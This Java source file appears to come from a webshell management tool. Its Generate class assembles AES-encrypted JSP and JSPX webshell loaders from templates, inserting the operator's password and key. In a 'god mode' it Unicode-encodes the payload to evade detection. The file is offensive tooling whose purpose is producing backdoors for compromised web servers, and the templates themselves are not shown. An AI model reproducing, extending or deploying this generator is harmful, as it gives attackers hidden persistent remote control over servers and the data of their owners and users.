package shells.cryptions.JavaAes;

import core.ApplicationContext;
import java.awt.Component;
import java.io.InputStream;
import javax.swing.Icon;
import javax.swing.JOptionPane;
import util.Log;
import util.functions;

class Generate {
    private static final String[] SUFFIX = {"jsp", "jspx"};

    Generate() {
    }

    public static byte[] GenerateShellLoder(String pass, String secretKey, boolean isBin) {
        String template;
        try {

            InputStream inputStream = Generate.class.getClassLoader().getResourceAsStream("shell/java/template/" + (isBin ? "raw" : "base64") + "GlobalCode.bin");
            String globalCode = new String(functions.readInputStream(inputStream));
            inputStream.close();
            String globalCode2 = globalCode.replace("{pass}", pass).replace("{secretKey}", secretKey);
            InputStream inputStream2 = Generate.class.getClassLoader().getResourceAsStream("shell/java/template/" + (isBin ? "raw" : "base64") + "Code.bin");
            String code = new String(functions.readInputStream(inputStream2));
            inputStream2.close();
            Object selectedValue = JOptionPane.showInputDialog((Component) null, "suffix", "selected suffix", 1, (Icon) null, SUFFIX, (Object) null);
            if (selectedValue == null) {
                return null;
            }
            String suffix = (String) selectedValue;
            InputStream inputStream3 = Generate.class.getClassLoader().getResourceAsStream("shell/java/template/shell." + suffix);
            String template2 = new String(functions.readInputStream(inputStream3));
            inputStream3.close();
            //jspx 需要处理
            if (suffix.equals(SUFFIX[1])) {
                globalCode2 = globalCode2.replace("<", "&lt;").replace(">", "&gt;");
                code = code.replace("<", "&lt;").replace(">", "&gt;");
            }
            //判断是不是上帝模式，如果是会进行unicode编码
            if (ApplicationContext.isGodMode()) {
                template = template2.replace("{globalCode}", functions.stringToUnicode(globalCode2)).replace("{code}", functions.stringToUnicode(code));
            } else {
                template = template2.replace("{globalCode}", globalCode2).replace("{code}", code);
            }
            return template.replace("\n", "").replace("\r", "").getBytes();
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    public static void main(String[] args) {
        System.out.println(new String(GenerateShellLoder("123", "key", false)));
    }
}
